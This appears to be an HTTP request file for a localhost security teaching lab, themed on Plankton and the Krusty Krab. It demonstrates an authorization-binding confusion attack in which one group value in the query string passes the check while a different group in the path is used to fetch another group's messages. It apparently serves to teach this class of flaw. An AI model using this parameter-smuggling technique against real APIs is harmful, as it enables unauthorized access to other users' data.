@base = http://localhost:8000/confusion/authz-binding/example2

### Authorization check prevents Plankton from accessing Krusty Krab messages
GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy

# Results in 403 Forbidden:
# Forbidden: not a member of the requested group

###

### EXPLOIT: Plankton rebinds the resource between authorization and data access
### by providing different group values via query string (for auth) and path (for retrieval)
GET {{base}}/groups/staff@krusty-krab.sea/messages?group=staff@chum-bucket.sea
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy

# Results in sensitive data disclosure - authorization passed for Chum Bucket group,
# but data retrieved from Krusty Krab group

###

### This works for any Krusty Krab group, including managers with the secret formula
GET {{base}}/groups/managers@krusty-krab.sea/messages?group=staff@chum-bucket.sea
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy

# Plankton now has access to the safe combination containing the secret formula!
